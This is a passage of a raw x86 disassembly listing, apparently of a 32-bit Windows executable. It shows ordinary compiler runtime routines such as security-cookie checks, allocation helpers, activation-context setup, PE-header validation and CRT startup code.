  404617:	ret    0x10
  40461a:	int3   
  40461b:	int3   
  40461c:	int3   
  40461d:	int3   
  40461e:	int3   
  40461f:	mov    edi,edi
  404621:	push   esi
  404622:	mov    esi,ecx
  404624:	jmp    0x404634
  404626:	mov    edx,DWORD PTR [esi]
  404628:	push   edx
  404629:	mov    eax,DWORD PTR [edx]
  40462b:	mov    DWORD PTR [esi],eax
  40462d:	call   DWORD PTR ds:0x4081b4
  404633:	pop    ecx
  404634:	cmp    DWORD PTR [esi],0x0
  404637:	jne    0x404626
  404639:	pop    esi
  40463a:	ret    
  40463b:	int3   
  40463c:	int3   
  40463d:	int3   
  40463e:	int3   
  40463f:	int3   
  404640:	mov    edi,edi
  404642:	push   ebp
  404643:	mov    ebp,esp
  404645:	push   ecx
  404646:	mov    eax,ds:0x40700c
  40464b:	xor    eax,ebp
  40464d:	mov    DWORD PTR [ebp-0x4],eax
  404650:	mov    eax,DWORD PTR [ebp+0x8]
  404653:	push   esi
  404654:	push   0x401474
  404659:	push   0x4014e8
  40465e:	mov    ecx,DWORD PTR [eax]
  404660:	push   eax
  404661:	mov    esi,DWORD PTR [ecx+0xc]
  404664:	mov    ecx,esi
  404666:	call   DWORD PTR ds:0x4081d8
  40466c:	call   esi
  40466e:	mov    ecx,DWORD PTR [ebp-0x4]
  404671:	xor    ecx,ebp
  404673:	pop    esi
  404674:	call   0x405170
  404679:	mov    esp,ebp
  40467b:	pop    ebp
  40467c:	ret    0x4
  40467f:	int3   
  404680:	int3   
  404681:	int3   
  404682:	int3   
  404683:	int3   
  404684:	jmp    0x4046fd
  404689:	int3   
  40468a:	int3   
  40468b:	int3   
  40468c:	int3   
  40468d:	int3   
  40468e:	mov    edi,edi
  404690:	push   ebp
  404691:	mov    ebp,esp
  404693:	push   esi
  404694:	mov    esi,ecx
  404696:	push   0x4
  404698:	mov    eax,DWORD PTR [esi+0x8]
  40469b:	inc    eax
  40469c:	push   eax
  40469d:	push   DWORD PTR [esi]
  40469f:	call   DWORD PTR ds:0x407004
  4046a5:	add    esp,0xc
  4046a8:	test   eax,eax
  4046aa:	jne    0x4046b0
  4046ac:	xor    eax,eax
  4046ae:	jmp    0x4046f3
  4046b0:	mov    DWORD PTR [esi],eax
  4046b2:	mov    eax,DWORD PTR [esi+0x8]
  4046b5:	push   0x4
  4046b7:	inc    eax
  4046b8:	push   eax
  4046b9:	push   DWORD PTR [esi+0x4]
  4046bc:	call   DWORD PTR ds:0x407004
  4046c2:	add    esp,0xc
  4046c5:	test   eax,eax
  4046c7:	je     0x4046ac
  4046c9:	mov    edx,DWORD PTR [esi+0x8]
  4046cc:	mov    ecx,DWORD PTR [esi]
  4046ce:	shl    edx,0x2
  4046d1:	mov    DWORD PTR [esi+0x4],eax
  4046d4:	add    ecx,edx
  4046d6:	je     0x4046df
  4046d8:	mov    eax,DWORD PTR [ebp+0x8]
  4046db:	mov    eax,DWORD PTR [eax]
  4046dd:	mov    DWORD PTR [ecx],eax
  4046df:	mov    ecx,DWORD PTR [esi+0x4]
  4046e2:	add    ecx,edx
  4046e4:	je     0x4046ed
  4046e6:	mov    eax,DWORD PTR [ebp+0xc]
  4046e9:	mov    eax,DWORD PTR [eax]
  4046eb:	mov    DWORD PTR [ecx],eax
  4046ed:	inc    DWORD PTR [esi+0x8]
  4046f0:	xor    eax,eax
  4046f2:	inc    eax
  4046f3:	pop    esi
  4046f4:	pop    ebp
  4046f5:	ret    0x8
  4046f8:	int3   
  4046f9:	int3   
  4046fa:	int3   
  4046fb:	int3   
  4046fc:	int3   
  4046fd:	mov    edi,edi
  4046ff:	push   esi
  404700:	mov    esi,ecx
  404702:	cmp    DWORD PTR [esi],0x0
  404705:	je     0x404713
  404707:	push   DWORD PTR [esi]
  404709:	call   DWORD PTR ds:0x4081b4
  40470f:	and    DWORD PTR [esi],0x0
  404712:	pop    ecx
  404713:	cmp    DWORD PTR [esi+0x4],0x0
  404717:	je     0x404727
  404719:	push   DWORD PTR [esi+0x4]
  40471c:	call   DWORD PTR ds:0x4081b4
  404722:	and    DWORD PTR [esi+0x4],0x0
  404726:	pop    ecx
  404727:	and    DWORD PTR [esi+0x8],0x0
  40472b:	pop    esi
  40472c:	ret    
  40472d:	int3   
  40472e:	int3   
  40472f:	int3   
  404730:	int3   
  404731:	int3   
  404732:	mov    edi,edi
  404734:	push   esi
  404735:	mov    esi,ecx
  404737:	push   DWORD PTR [esi]
  404739:	call   0x404d30
  40473e:	and    DWORD PTR [esi],0x0
  404741:	pop    ecx
  404742:	pop    esi
  404743:	ret    
  404744:	int3   
  404745:	int3   
  404746:	int3   
  404747:	int3   
  404748:	int3   
  404749:	lea    eax,[ecx+0x4]
  40474c:	cmp    DWORD PTR [ecx],eax
  40474e:	jne    0x40475a
  404754:	ret    
  404755:	int3   
  404756:	int3   
  404757:	int3   
  404758:	int3   
  404759:	int3   
  40475a:	push   DWORD PTR [ecx]
  40475c:	call   DWORD PTR ds:0x4081b4
  404762:	pop    ecx
  404763:	ret    
  404764:	int3   
  404765:	int3   
  404766:	int3   
  404767:	int3   
  404768:	int3   
  404769:	mov    edi,edi
  40476b:	push   ebp
  40476c:	mov    ebp,esp
  40476e:	push   esi
  40476f:	push   DWORD PTR [ebp+0x8]
  404772:	mov    esi,ecx
  404774:	call   DWORD PTR ds:0x4081b0
  40477a:	pop    ecx
  40477b:	test   eax,eax
  40477d:	je     0x404786
  40477f:	mov    DWORD PTR [esi],eax
  404781:	pop    esi
  404782:	pop    ebp
  404783:	ret    0x4
  404786:	mov    ecx,0x8007000e
  40478b:	call   0x401cea
  404790:	int3   
  404791:	int3   
  404792:	int3   
  404793:	int3   
  404794:	int3   
  404795:	int3   
  404796:	mov    edi,edi
  404798:	push   edi
  404799:	xor    eax,eax
  40479b:	mov    edx,0x407568
  4047a0:	push   0x6
  4047a2:	pop    ecx
  4047a3:	mov    edi,edx
  4047a5:	rep stos DWORD PTR es:[edi],eax
  4047a7:	mov    ds:0x407580,eax
  4047ac:	mov    ecx,edx
  4047ae:	mov    ds:0x407584,eax
  4047b3:	mov    ds:0x407588,eax
  4047b8:	mov    eax,0x400000
  4047bd:	mov    DWORD PTR ds:0x407550,0x3c
  4047c7:	mov    ds:0x407558,eax
  4047cc:	mov    ds:0x407554,eax
  4047d1:	mov    BYTE PTR ds:0x40755c,0x1
  4047d8:	mov    DWORD PTR ds:0x407560,0x800
  4047e2:	mov    DWORD PTR ds:0x407564,0x401630
  4047ec:	call   0x401d4b
  4047f1:	pop    edi
  4047f2:	test   eax,eax
  4047f4:	jns    0x4047fd
  4047f6:	mov    BYTE PTR ds:0x4075b0,0x1
  4047fd:	mov    eax,0x407550
  404802:	ret    
  404803:	int3   
  404804:	int3   
  404805:	int3   
  404806:	int3   
  404807:	int3   
  404808:	mov    eax,ds:0x407580
  40480d:	test   eax,eax
  40480f:	je     0x404820
  404811:	push   eax
  404812:	call   DWORD PTR ds:0x4081b4
  404818:	and    DWORD PTR ds:0x407580,0x0
  40481f:	pop    ecx
  404820:	and    DWORD PTR ds:0x407584,0x0
  404827:	and    DWORD PTR ds:0x407588,0x0
  40482e:	ret    
  40482f:	int3   
  404830:	int3   
  404831:	int3   
  404832:	int3   
  404833:	int3   
  404834:	mov    eax,ds:0x407040
  404839:	test   eax,eax
  40483b:	je     0x40484c
  40483d:	push   eax
  40483e:	call   DWORD PTR ds:0x4081b4
  404844:	and    DWORD PTR ds:0x407040,0x0
  40484b:	pop    ecx
  40484c:	and    DWORD PTR ds:0x407044,0x0
  404853:	and    DWORD PTR ds:0x407048,0x0
  40485a:	ret    
  40485b:	int3   
  40485c:	int3   
  40485d:	int3   
  40485e:	int3   
  40485f:	int3   
  404860:	mov    edi,edi
  404862:	push   ebp
  404863:	mov    ebp,esp
  404865:	push   0x0
  404867:	push   0x4
  404869:	lea    eax,[ebp+0x10]
  40486c:	push   eax
  40486d:	push   0xd
  40486f:	push   0x401640
  404874:	push   0x2b
  404876:	push   DWORD PTR [ebp+0xc]
  404879:	push   DWORD PTR [ebp+0x8]
  40487c:	call   DWORD PTR ds:0x408138
  404882:	add    esp,0x20
  404885:	pop    ebp
  404886:	ret    0xc
  404889:	int3   
  40488a:	int3   
  40488b:	int3   
  40488c:	int3   
  40488d:	int3   
  40488e:	mov    edi,edi
  404890:	push   ebp
  404891:	mov    ebp,esp
  404893:	sub    esp,0x234
  404899:	mov    eax,ds:0x40700c
  40489e:	xor    eax,ebp
  4048a0:	mov    DWORD PTR [ebp-0x4],eax
  4048a3:	push   ebx
  4048a4:	push   esi
  4048a5:	push   edi
  4048a6:	push   0x8
  4048a8:	mov    ebx,ecx
  4048aa:	call   DWORD PTR ds:0x408028
  4048b0:	mov    esi,eax
  4048b2:	test   esi,esi
  4048b4:	je     0x404a0a
  4048ba:	xor    eax,eax
  4048bc:	xor    edi,edi
  4048be:	push   0x206
  4048c3:	mov    WORD PTR [ebp-0x210],ax
  4048ca:	lea    eax,[ebp-0x20e]
  4048d0:	push   edi
  4048d1:	mov    DWORD PTR [esi],edi
  4048d3:	push   eax
  4048d4:	mov    DWORD PTR [esi+0x4],edi
  4048d7:	call   0x4054b8
  4048dc:	add    esp,0xc
  4048df:	lea    eax,[ebp-0x210]
  4048e5:	push   0x104
  4048ea:	push   eax
  4048eb:	push   ebx
  4048ec:	call   DWORD PTR ds:0x408084
  4048f2:	test   eax,eax
  4048f4:	je     0x4049d1
  4048fa:	push   0x7
  4048fc:	xor    eax,eax
  4048fe:	lea    edi,[ebp-0x22c]
  404904:	pop    ecx
  404905:	rep stos DWORD PTR es:[edi],eax
  404907:	lea    eax,[ebp-0x210]
  40490d:	mov    DWORD PTR [ebp-0x230],0x20
  404917:	mov    DWORD PTR [ebp-0x228],eax
  40491d:	lea    eax,[ebp-0x230]
  404923:	push   eax
  404924:	mov    DWORD PTR [ebp-0x22c],0x88
  40492e:	mov    DWORD PTR [ebp-0x21c],0x7b
  404938:	mov    DWORD PTR [ebp-0x214],ebx
  40493e:	call   DWORD PTR ds:0x4080dc
  404944:	mov    ecx,eax
  404946:	mov    DWORD PTR [esi],ecx
  404948:	cmp    ecx,0xffffffff
  40494b:	jne    0x40497f
  40494d:	mov    eax,ds:0x407014
  404952:	cmp    eax,0x407014
  404957:	je     0x4049c6
  404959:	test   BYTE PTR [eax+0x1c],0x4
  40495d:	je     0x4049c6
  40495f:	call   0x401d97
  404964:	push   eax
  404965:	mov    eax,ds:0x407014
  40496a:	mov    edx,0x401640
  40496f:	push   DWORD PTR [eax+0x14]
  404972:	push   DWORD PTR [eax+0x10]
  404975:	push   0xa
  404977:	pop    ecx
  404978:	call   0x403e8a
  40497d:	jmp    0x4049c6
  40497f:	lea    eax,[esi+0x4]
  404982:	push   eax
  404983:	push   ecx
  404984:	call   DWORD PTR ds:0x4080d8
  40498a:	test   eax,eax
  40498c:	jne    0x404a0a
  40498e:	mov    eax,ds:0x407014
  404993:	cmp    eax,0x407014
  404998:	je     0x4049be
  40499a:	test   BYTE PTR [eax+0x1c],0x4
  40499e:	je     0x4049be
  4049a0:	call   0x401d97
  4049a5:	push   eax
  4049a6:	mov    eax,ds:0x407014
  4049ab:	mov    edx,0x401640
  4049b0:	push   DWORD PTR [eax+0x14]
  4049b3:	push   DWORD PTR [eax+0x10]
  4049b6:	push   0xb
  4049b8:	pop    ecx
  4049b9:	call   0x403e8a
  4049be:	push   DWORD PTR [esi]
  4049c0:	call   DWORD PTR ds:0x4080e0
  4049c6:	push   esi
  4049c7:	call   DWORD PTR ds:0x40802c
  4049cd:	xor    esi,esi
  4049cf:	jmp    0x404a0a
  4049d1:	mov    eax,ds:0x407014
  4049d6:	cmp    eax,0x407014
  4049db:	je     0x404a01
  4049dd:	test   BYTE PTR [eax+0x1c],0x4
  4049e1:	je     0x404a01
  4049e3:	call   0x401d97
  4049e8:	push   eax
  4049e9:	mov    eax,ds:0x407014
  4049ee:	mov    edx,0x401640
  4049f3:	push   DWORD PTR [eax+0x14]
  4049f6:	push   DWORD PTR [eax+0x10]
  4049f9:	push   0xc
  4049fb:	pop    ecx
  4049fc:	call   0x403e8a
  404a01:	push   esi
  404a02:	call   DWORD PTR ds:0x40802c
  404a08:	mov    esi,edi
  404a0a:	mov    eax,ds:0x407014
  404a0f:	cmp    eax,0x407014
  404a14:	je     0x404a28
  404a16:	test   BYTE PTR [eax+0x1c],0x10
  404a1a:	je     0x404a28
  404a1c:	push   esi
  404a1d:	push   DWORD PTR [eax+0x14]
  404a20:	push   DWORD PTR [eax+0x10]
  404a23:	call   0x404860
  404a28:	mov    ecx,DWORD PTR [ebp-0x4]
  404a2b:	mov    eax,esi
  404a2d:	pop    edi
  404a2e:	pop    esi
  404a2f:	xor    ecx,ebp
  404a31:	pop    ebx
  404a32:	call   0x405170
  404a37:	mov    esp,ebp
  404a39:	pop    ebp
  404a3a:	ret    
  404a3b:	int3   
  404a3c:	int3   
  404a3d:	int3   
  404a3e:	int3   
  404a3f:	int3   
  404a40:	mov    edi,edi
  404a42:	push   ebx
  404a43:	push   esi
  404a44:	push   edi
  404a45:	mov    edi,ecx
  404a47:	xor    esi,esi
  404a49:	test   edi,edi
  404a4b:	je     0x404aaa
  404a4d:	mov    ebx,DWORD PTR [edi]
  404a4f:	test   ebx,ebx
  404a51:	je     0x404aaa
  404a53:	push   DWORD PTR [ebx+0x4]
  404a56:	push   esi
  404a57:	call   DWORD PTR ds:0x4080d4
  404a5d:	mov    esi,eax
  404a5f:	test   esi,esi
  404a61:	je     0x404a78
  404a63:	push   DWORD PTR [ebx]
  404a65:	call   DWORD PTR ds:0x4080e0
  404a6b:	push   DWORD PTR [edi]
  404a6d:	call   DWORD PTR ds:0x40802c
  404a73:	and    DWORD PTR [edi],0x0
  404a76:	jmp    0x404aaa
  404a78:	mov    ecx,DWORD PTR ds:0x407014
  404a7e:	cmp    ecx,0x407014
  404a84:	je     0x404ad2
  404a86:	test   BYTE PTR [ecx+0x1c],0x4
  404a8a:	je     0x404ab0
  404a8c:	call   0x401d97
  404a91:	push   eax
  404a92:	mov    eax,ds:0x407014
  404a97:	mov    edx,0x401640
  404a9c:	push   DWORD PTR [eax+0x14]
  404a9f:	push   DWORD PTR [eax+0x10]
  404aa2:	push   0xe
  404aa4:	pop    ecx
  404aa5:	call   0x403e8a
  404aaa:	mov    ecx,DWORD PTR ds:0x407014
  404ab0:	cmp    ecx,0x407014
  404ab6:	je     0x404ad2
  404ab8:	test   BYTE PTR [ecx+0x1c],0x10
  404abc:	je     0x404ad2
  404abe:	push   esi
  404abf:	push   DWORD PTR [ecx+0x14]
  404ac2:	mov    edx,0x401640
  404ac7:	push   DWORD PTR [ecx+0x10]
  404aca:	push   0xf
  404acc:	pop    ecx
  404acd:	call   0x403e8a
  404ad2:	pop    edi
  404ad3:	mov    eax,esi
  404ad5:	pop    esi
  404ad6:	pop    ebx
  404ad7:	ret    
  404ad8:	int3   
  404ad9:	int3   
  404ada:	int3   
  404adb:	int3   
  404adc:	int3   
  404add:	mov    edi,edi
  404adf:	push   ebp
  404ae0:	mov    ebp,esp
  404ae2:	and    esp,0xfffffff8
  404ae5:	push   ecx
  404ae6:	push   esi
  404ae7:	mov    esi,ecx
  404ae9:	and    DWORD PTR [esi],0x0
  404aec:	mov    eax,ds:0x407018
  404af1:	cmp    eax,0xffffffff
  404af4:	jne    0x404b22
  404af6:	mov    ecx,DWORD PTR ds:0x40754c
  404afc:	test   ecx,ecx
  404afe:	je     0x404b1d
  404b00:	cmp    ecx,eax
  404b02:	jne    0x404b08
  404b04:	xor    eax,eax
  404b06:	jmp    0x404b2d
  404b08:	mov    edx,DWORD PTR ds:0x40758c
  404b0e:	call   0x404b5d
  404b13:	mov    eax,ds:0x407018
  404b18:	cmp    eax,0xffffffff
  404b1b:	jne    0x404b22
  404b1d:	xor    eax,eax
  404b1f:	inc    eax
  404b20:	jmp    0x404b2d
  404b22:	and    DWORD PTR [esi],0x0
  404b25:	push   esi
  404b26:	push   eax
  404b27:	call   DWORD PTR ds:0x4080d8
  404b2d:	pop    esi
  404b2e:	mov    esp,ebp
  404b30:	pop    ebp
  404b31:	ret    
  404b32:	int3   
  404b33:	int3   
  404b34:	int3   
  404b35:	int3   
  404b36:	int3   
  404b37:	test   ecx,ecx
  404b39:	je     0x404b44
  404b3b:	push   ecx
  404b3c:	push   0x0
  404b3e:	call   DWORD PTR ds:0x4080d4
  404b44:	ret    
  404b45:	int3   
  404b46:	int3   
  404b47:	int3   
  404b48:	int3   
  404b49:	int3   
  404b4a:	cmp    DWORD PTR ds:0x407018,0xfffffffd
  404b51:	jne    0x404c79
  404b57:	ret    
  404b58:	int3   
  404b59:	int3   
  404b5a:	int3   
  404b5b:	int3   
  404b5c:	int3   
  404b5d:	mov    edi,edi
  404b5f:	push   ebp
  404b60:	mov    ebp,esp
  404b62:	sub    esp,0x234
  404b68:	mov    eax,ds:0x40700c
  404b6d:	xor    eax,ebp
  404b6f:	mov    DWORD PTR [ebp-0x4],eax
  404b72:	cmp    DWORD PTR ds:0x407018,0xffffffff
  404b79:	push   ebx
  404b7a:	push   esi
  404b7b:	push   edi
  404b7c:	mov    ebx,edx
  404b7e:	mov    esi,ecx
  404b80:	jne    0x404c1c
  404b86:	and    DWORD PTR [ebp-0x230],0x0
  404b8d:	lea    edi,[ebp-0x22c]
  404b93:	push   0x7
  404b95:	xor    eax,eax
  404b97:	pop    ecx
  404b98:	rep stos DWORD PTR es:[edi],eax
  404b9a:	test   esi,esi
  404b9c:	jne    0x404ba7
  404b9e:	push   esi
  404b9f:	call   DWORD PTR ds:0x408074
  404ba5:	mov    esi,eax
  404ba7:	push   0x104
  404bac:	lea    eax,[ebp-0x210]
  404bb2:	push   eax
  404bb3:	push   esi
  404bb4:	call   DWORD PTR ds:0x408084
  404bba:	lea    eax,[ebp-0x210]
  404bc0:	mov    DWORD PTR [ebp-0x230],0x20
  404bca:	mov    DWORD PTR [ebp-0x228],eax
  404bd0:	movzx  eax,bx
  404bd3:	mov    DWORD PTR [ebp-0x21c],eax
  404bd9:	lea    eax,[ebp-0x230]
  404bdf:	push   eax
  404be0:	mov    DWORD PTR [ebp-0x22c],0x88
  404bea:	mov    DWORD PTR [ebp-0x214],esi
  404bf0:	call   DWORD PTR ds:0x4080dc
  404bf6:	mov    edx,eax
  404bf8:	cmp    edx,0xffffffff
  404bfb:	je     0x404c1c
  404bfd:	mov    ecx,edx
  404bff:	mov    esi,0x407018
  404c04:	or     eax,0xffffffff
  404c07:	lock cmpxchg DWORD PTR [esi],ecx
  404c0b:	cmp    eax,0xffffffff
  404c0e:	je     0x404c17
  404c10:	push   edx
  404c11:	call   DWORD PTR ds:0x4080e0
  404c17:	call   0x404c79
  404c1c:	mov    ecx,DWORD PTR [ebp-0x4]
  404c1f:	xor    eax,eax
  404c21:	cmp    DWORD PTR ds:0x407018,0xffffffff
  404c28:	pop    edi
  404c29:	setne  al
  404c2c:	xor    ecx,ebp
  404c2e:	pop    esi
  404c2f:	pop    ebx
  404c30:	call   0x405170
  404c35:	mov    esp,ebp
  404c37:	pop    ebp
  404c38:	ret    
  404c39:	int3   
  404c3a:	int3   
  404c3b:	int3   
  404c3c:	int3   
  404c3d:	int3   
  404c3e:	mov    edi,edi
  404c40:	push   ebp
  404c41:	mov    ebp,esp
  404c43:	push   ecx
  404c44:	push   esi
  404c45:	xor    esi,esi
  404c47:	lea    ecx,[ebp-0x4]
  404c4a:	mov    DWORD PTR [ebp-0x4],esi
  404c4d:	call   0x404add
  404c52:	test   eax,eax
  404c54:	je     0x404c6f
  404c56:	push   esi
  404c57:	push   esi
  404c58:	push   0x401650
  404c5d:	call   DWORD PTR ds:0x40806c
  404c63:	mov    ecx,DWORD PTR [ebp-0x4]
  404c66:	mov    esi,eax
  404c68:	call   0x404b37
  404c6d:	mov    eax,esi
  404c6f:	pop    esi
  404c70:	mov    esp,ebp
  404c72:	pop    ebp
  404c73:	ret    
  404c74:	int3   
  404c75:	int3   
  404c76:	int3   
  404c77:	int3   
  404c78:	int3   
  404c79:	mov    ecx,DWORD PTR ds:0x4075c0
  404c7f:	test   ecx,ecx
  404c81:	jne    0x404ca9
  404c83:	call   0x404c3e
  404c88:	mov    ecx,eax
  404c8a:	mov    DWORD PTR ds:0x4075c0,ecx
  404c90:	test   ecx,ecx
  404c92:	jne    0x404ca9
  404c94:	push   eax
  404c95:	push   eax
  404c96:	push   0x401650
  404c9b:	call   DWORD PTR ds:0x40806c
  404ca1:	mov    ecx,eax
  404ca3:	mov    DWORD PTR ds:0x4075c0,ecx
  404ca9:	xor    eax,eax
  404cab:	test   ecx,ecx
  404cad:	setne  al
  404cb0:	ret    
  404cb1:	int3   
  404cb2:	int3   
  404cb3:	int3   
  404cb4:	int3   
  404cb5:	int3   
  404cb6:	int3   
  404cb7:	int3   
  404cb8:	int3   
  404cb9:	int3   
  404cba:	int3   
  404cbb:	int3   
  404cbc:	int3   
  404cbd:	int3   
  404cbe:	int3   
  404cbf:	int3   
  404cc0:	mov    edi,edi
  404cc2:	push   ebp
  404cc3:	mov    ebp,esp
  404cc5:	push   ecx
  404cc6:	push   esi
  404cc7:	push   DWORD PTR [ebp+0x8]
  404cca:	mov    esi,ecx
  404ccc:	mov    DWORD PTR [ebp-0x4],esi
  404ccf:	call   0x4054d0
  404cd4:	mov    DWORD PTR [esi],0x4010e0
  404cda:	mov    eax,esi
  404cdc:	pop    esi
  404cdd:	mov    esp,ebp
  404cdf:	pop    ebp
  404ce0:	ret    0x4
  404ce3:	int3   
  404ce4:	int3   
  404ce5:	int3   
  404ce6:	int3   
  404ce7:	int3   
  404ce8:	mov    edi,edi
  404cea:	push   esi
  404ceb:	mov    esi,ecx
  404ced:	call   0x4054c4
  404cf2:	cmp    DWORD PTR [esi+0x4],0x0
  404cf6:	mov    DWORD PTR [esi],0x4010e0
  404cfc:	jne    0x404d0c
  404cfe:	cmp    DWORD PTR [esi+0x8],0x0
  404d02:	jne    0x404d0c
  404d04:	mov    eax,ds:0x407000
  404d09:	mov    DWORD PTR [esi+0x4],eax
  404d0c:	mov    eax,esi
  404d0e:	pop    esi
  404d0f:	ret    
  404d10:	int3   
  404d11:	int3   
  404d12:	int3   
  404d13:	int3   
  404d14:	int3   
  404d15:	int3   
  404d16:	int3   
  404d17:	int3   
  404d18:	int3   
  404d19:	int3   
  404d1a:	int3   
  404d1b:	int3   
  404d1c:	int3   
  404d1d:	int3   
  404d1e:	int3   
  404d1f:	int3   
  404d20:	mov    DWORD PTR [ecx],0x4010e0
  404d26:	jmp    0x4054dc
  404d2b:	int3   
  404d2c:	int3   
  404d2d:	int3   
  404d2e:	int3   
  404d2f:	int3   
  404d30:	jmp    DWORD PTR ds:0x4081b4
  404d36:	int3   
  404d37:	int3   
  404d38:	int3   
  404d39:	int3   
  404d3a:	int3   
  404d3b:	int3   
  404d3c:	int3   
  404d3d:	int3   
  404d3e:	int3   
  404d3f:	int3   
  404d40:	mov    edi,edi
  404d42:	push   ebp
  404d43:	mov    ebp,esp
  404d45:	push   esi
  404d46:	mov    esi,ecx
  404d48:	mov    DWORD PTR [esi],0x4010e0
  404d4e:	call   0x4054dc
  404d53:	test   BYTE PTR [ebp+0x8],0x1
  404d57:	je     0x404d61
  404d59:	push   esi
  404d5a:	call   DWORD PTR ds:0x4081b4
  404d60:	pop    ecx
  404d61:	mov    eax,esi
  404d63:	pop    esi
  404d64:	pop    ebp
  404d65:	ret    0x4
  404d68:	int3   
  404d69:	int3   
  404d6a:	int3   
  404d6b:	int3   
  404d6c:	int3   
  404d6d:	int3   
  404d6e:	int3   
  404d6f:	int3   
  404d70:	mov    edi,edi
  404d72:	push   ebp
  404d73:	mov    ebp,esp
  404d75:	sub    esp,0xc
  404d78:	push   ecx
  404d79:	lea    ecx,[ebp-0xc]
  404d7c:	call   0x404cc0
  404d81:	push   0x40612c
  404d86:	lea    eax,[ebp-0xc]
  404d89:	push   eax
  404d8a:	call   0x405508
  404d8f:	int3   
  404d90:	int3   
  404d91:	int3   
  404d92:	int3   
  404d93:	int3   
  404d94:	int3   
  404d95:	mov    edi,edi
  404d97:	push   ebp
  404d98:	mov    ebp,esp
  404d9a:	sub    esp,0xc
  404d9d:	push   esi
  404d9e:	jmp    0x404dad
  404da0:	push   DWORD PTR [ebp+0x8]
  404da3:	call   0x4054fc
  404da8:	pop    ecx
  404da9:	test   eax,eax
  404dab:	je     0x404dc0
  404dad:	push   DWORD PTR [ebp+0x8]
  404db0:	call   DWORD PTR ds:0x4081b0
  404db6:	pop    ecx
  404db7:	test   eax,eax
  404db9:	je     0x404da0
  404dbb:	pop    esi
  404dbc:	mov    esp,ebp
  404dbe:	pop    ebp
  404dbf:	ret    
  404dc0:	mov    eax,ds:0x40719c
  404dc5:	mov    esi,0x407190
  404dca:	test   al,0x1
  404dcc:	jne    0x404de8
  404dce:	or     eax,0x1
  404dd1:	mov    ecx,esi
  404dd3:	mov    ds:0x40719c,eax
  404dd8:	call   0x404ce8
  404ddd:	push   0x405e40
  404de2:	call   0x405223
  404de7:	pop    ecx
  404de8:	push   esi
  404de9:	lea    ecx,[ebp-0xc]
  404dec:	call   0x404cc0
  404df1:	push   0x40612c
  404df6:	lea    eax,[ebp-0xc]
  404df9:	push   eax
  404dfa:	call   0x405508
  404dff:	int3   
  404e00:	int3   
  404e01:	int3   
  404e02:	int3   
  404e03:	int3   
  404e04:	int3   
  404e05:	int3   
  404e06:	int3   
  404e07:	int3   
  404e08:	int3   
  404e09:	int3   
  404e0a:	int3   
  404e0b:	int3   
  404e0c:	int3   
  404e0d:	int3   
  404e0e:	int3   
  404e0f:	int3   
  404e10:	mov    eax,0x5a4d
  404e15:	cmp    WORD PTR ds:0x400000,ax
  404e1c:	je     0x404e22
  404e1e:	xor    eax,eax
  404e20:	jmp    0x404e70
  404e22:	mov    ecx,DWORD PTR ds:0x40003c
  404e28:	cmp    DWORD PTR [ecx+0x400000],0x4550
  404e32:	jne    0x404e1e
  404e34:	movzx  eax,WORD PTR [ecx+0x400018]
  404e3b:	cmp    eax,0x10b
  404e40:	je     0x404e5c
  404e42:	cmp    eax,0x20b
  404e47:	jne    0x404e1e
  404e49:	xor    eax,eax
  404e4b:	cmp    DWORD PTR [ecx+0x400084],0xe
  404e52:	jbe    0x404e70
  404e54:	cmp    DWORD PTR [ecx+0x4000f8],eax
  404e5a:	jmp    0x404e6d
  404e5c:	xor    eax,eax
  404e5e:	cmp    DWORD PTR [ecx+0x400074],0xe
  404e65:	jbe    0x404e70
  404e67:	cmp    DWORD PTR [ecx+0x4000e8],eax
  404e6d:	setne  al
  404e70:	push   0x2
  404e72:	mov    ds:0x4071b8,eax
  404e77:	call   0x4055fe
  404e7c:	push   eax
  404e7d:	call   DWORD PTR ds:0x408178
  404e83:	or     DWORD PTR ds:0x4075cc,0xffffffff
  404e8a:	or     DWORD PTR ds:0x4075d0,0xffffffff
  404e91:	pop    ecx
  404e92:	pop    ecx
  404e93:	call   DWORD PTR ds:0x408160
  404e99:	mov    ecx,DWORD PTR ds:0x4074e8
  404e9f:	mov    DWORD PTR [eax],ecx
  404ea1:	call   DWORD PTR ds:0x408184
  404ea7:	mov    ecx,DWORD PTR ds:0x4074dc
  404ead:	mov    DWORD PTR [eax],ecx
  404eaf:	call   0x405650
  404eb4:	cmp    DWORD PTR ds:0x407008,0x0
  404ebb:	jne    0x404ec9
  404ebd:	push   0x405650
  404ec2:	call   DWORD PTR ds:0x408150
  404ec8:	pop    ecx
  404ec9:	call   0x40585f
  404ece:	xor    eax,eax
  404ed0:	ret    
  404ed1:	int3   
  404ed2:	int3   
  404ed3:	int3   
  404ed4:	int3   
  404ed5:	int3   
  404ed6:	int3   
  404ed7:	int3   
  404ed8:	int3   
  404ed9:	int3   
  404eda:	int3   
  404edb:	int3   
  404edc:	int3   
  404edd:	int3   
  404ede:	int3   
  404edf:	int3   
  404ee0:	mov    eax,ds:0x4074e4
  404ee5:	push   0x4071bc
  404eea:	push   DWORD PTR ds:0x4074e0
  404ef0:	mov    ds:0x4071bc,eax
  404ef5:	push   0x4071b0
  404efa:	push   0x4071ac
  404eff:	push   0x4071a8
  404f04:	call   DWORD PTR ds:0x4081bc
  404f0a:	add    esp,0x14
  404f0d:	mov    ds:0x4071b4,eax
  404f12:	ret    
  404f13:	int3   
  404f14:	int3   
  404f15:	int3   
  404f16:	int3   
  404f17:	int3   
  404f18:	push   0x5c
  404f1a:	push   0x406168
  404f1f:	call   0x405884
  404f24:	and    DWORD PTR [ebp-0x24],0x0
  404f28:	and    DWORD PTR [ebp-0x4],0x0
  404f2c:	lea    eax,[ebp-0x6c]
  404f2f:	push   eax
  404f30:	call   DWORD PTR ds:0x408094
  404f36:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  404f3d:	xor    ebx,ebx
  404f3f:	inc    ebx
  404f40:	mov    DWORD PTR [ebp-0x4],ebx
  404f43:	mov    eax,fs:0x18
  404f49:	mov    edi,DWORD PTR [eax+0x4]
  404f4c:	xor    esi,esi
  404f4e:	mov    edx,0x4075c4
  404f53:	mov    ecx,edi
  404f55:	xor    eax,eax
  404f57:	lock cmpxchg DWORD PTR [edx],ecx
  404f5b:	test   eax,eax
  404f5d:	je     0x404f65
  404f5f:	cmp    eax,edi
  404f61:	jne    0x404f77
  404f63:	mov    esi,ebx
  404f65:	cmp    DWORD PTR ds:0x4075c8,ebx
  404f6b:	jne    0x404f84
  404f6d:	push   0x1f
  404f6f:	call   0x40563a
  404f74:	pop    ecx
  404f75:	jmp    0x404fb3
  404f77:	push   0x3e8
  404f7c:	call   DWORD PTR ds:0x408104
  404f82:	jmp    0x404f4e
  404f84:	cmp    DWORD PTR ds:0x4075c8,0x0
  404f8b:	jne    0x404fad
